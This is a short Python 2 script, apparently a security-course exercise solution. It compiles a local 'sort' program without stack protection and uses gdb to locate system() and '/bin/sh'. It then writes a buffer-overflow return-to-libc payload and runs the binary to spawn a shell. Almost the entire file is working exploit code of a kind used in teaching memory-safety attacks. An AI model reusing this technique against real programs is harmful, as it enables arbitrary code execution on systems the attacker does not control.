#!/usr/bin/python
import subprocess
import os
print "This script works only on 32 bit systems"
print "Compiling..."
subprocess.call('gcc -g sort.c -o sort -fno-stack-protector',shell=True)
print "Generating run config"
f0=open('./sample.txt','w+')
f0.write("a\n"*13)
f0.close()
f1=open('./commands.gdb', 'w+')
f1.write("set width 0\n")
f1.write("set height 0\n")
f1.write("set verbose on\n")
f1.write("b main\n")
f1.write("commands 1\n")
f1.write("  print &system\n")
f1.write('  find &system,+9999999,"/bin/sh"\n')
f1.write("  continue\n")
f1.write("end\n")
f1.write("run sample.txt\n")
f1.close()
print "Exploiting..."
subprocess.call('gdb --batch --command=./commands.gdb --args ./sort sample.txt > gdb.log', shell=True)
output=subprocess.check_output('cat gdb.log | grep --color=none -oE 0x[0-9a-fA-F]{8} | head -n 4 | tail -n 2',shell=True)
system_addr,sh_addr=output.splitlines()
f2=open('./data_exploit.txt', 'w+')
print("System function address: "+system_addr)
print("Dummy return address: "+system_addr)
print('"/bin/sh" found address: '+sh_addr)
# generate data for shellcode injection
# Shellcode system_addr.lstrip('0x')*2+sh_addr.lstrip('0x')
print >> f2, "aaaaaaaa"*13+system_addr.lstrip('0x')*2+sh_addr.lstrip('0x')
f2.close()
print "Run the following to exploit:"
print "./sort data_exploit.txt"
os.system('./sort data_exploit.txt')